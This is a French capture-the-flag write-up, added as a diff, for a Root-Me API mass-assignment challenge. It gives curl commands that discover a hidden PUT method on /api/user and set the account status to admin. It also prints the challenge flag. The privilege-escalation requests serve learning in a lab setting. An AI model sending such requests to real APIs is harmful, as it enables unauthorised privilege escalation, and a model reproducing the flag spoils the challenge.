@@ -1,0 +1,110 @@
+# Challenge API - Mass Assignment
+
+**Lien** : https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment  
+**API** : http://challenge01.root-me.org:59090/
+
+## Énoncé
+> Votre ami vous remercie pour votre précédente remontée de vulnérabilité, et vous assure que cette fois-ci, il a supprimé la possibilité d'accès aux notes, et il a même créé un rôle d'administration !
+
+---
+
+## Qu'est-ce que le Mass Assignment ?
+
+Le Mass Assignment est une vulnérabilité où une API accepte des paramètres qu'elle ne devrait pas. Par exemple, si on peut injecter `"status":"admin"` dans une requête et que le serveur l'applique sans vérifier, on peut élever nos privilèges.
+
+---
+
+## Ma démarche
+
+### 1. Exploration de l'API
+
+J'ai commencé par explorer les endpoints disponibles. En accédant à la documentation Swagger, j'ai trouvé :
+
+| Méthode | Endpoint | Description |
+|---------|----------|-------------|
+| POST | `/api/signup` | Créer un compte |
+| POST | `/api/login` | Se connecter |
+| GET | `/api/user` | Infos utilisateur |
+| PUT | `/api/note` | Modifier sa note |
+| GET | `/api/flag` | Récupérer le flag (admin only) |
+
+### 2. Création d'un compte et tests initiaux
+
+```bash
+# Création du compte
+curl -X POST http://challenge01.root-me.org:59090/api/signup \
+  -H "Content-Type: application/json" \
+  -d '{"username":"thibault_test","password":"test123"}'
+
+# Connexion
+curl -X POST http://challenge01.root-me.org:59090/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"thibault_test","password":"test123"}' \
+  -c cookies.txt
+```
+
+En vérifiant `/api/user`, je vois que mon statut est `guest`. Il me faut devenir `admin` pour accéder au flag.
+
+### 3. Tentatives sur /api/note (échec)
+
+J'ai d'abord essayé d'injecter le statut via l'endpoint `/api/note` :
+
+```bash
+curl -X PUT http://challenge01.root-me.org:59090/api/note \
+  -H "Content-Type: application/json" \
+  -b cookies.txt \
+  -d '{"note":"test","status":"admin"}'
+```
+
+**Résultat** : La note est modifiée, mais mon statut reste `guest`. L'endpoint filtre les champs non autorisés.
+
+### 4. L'idée : tester d'autres méthodes HTTP
+
+Le Swagger ne montrait que GET pour `/api/user`, mais je me suis dit : **et si d'autres méthodes étaient disponibles ?**
+
+J'ai testé avec OPTIONS :
+
+```bash
+curl -X OPTIONS http://challenge01.root-me.org:59090/api/user -i
+```
+
+Et là, j'ai découvert que **PUT était accepté** sur `/api/user` !
+
+### 5. Exploitation de la vulnérabilité
+
+```bash
+curl -X PUT http://challenge01.root-me.org:59090/api/user \
+  -H "Content-Type: application/json" \
+  -b cookies.txt \
+  -d '{"status":"admin"}'
+```
+
+**Ça a marché !** Mon statut est passé à `admin`.
+
+### 6. Récupération du flag
+
+```bash
+curl http://challenge01.root-me.org:59090/api/flag -b cookies.txt
+```
+
+---
+
+## 🚩 Flag
+
+```
+RM{4lw4yS_ch3ck_0pt10ns_m3th0d}
+```
+
+Le flag lui-même donne un indice : **"Always check OPTIONS method"** - toujours vérifier la méthode OPTIONS pour découvrir les endpoints cachés !
+
+---
+
+## Ce que j'ai appris
+
+1. **Ne pas se fier uniquement à la documentation** - Le Swagger n'affichait que GET, mais PUT était disponible
+2. **Toujours tester la méthode OPTIONS** - Elle révèle les méthodes HTTP autorisées sur un endpoint
+3. **Le Mass Assignment peut être sur n'importe quel endpoint** - Pas forcément celui qu'on attend
+4. **Être méthodique** - Tester chaque endpoint avec différentes méthodes et paramètresllenge
+
+![proxy](image/api/challenge.png)
+![proxy](image/api/request.png)
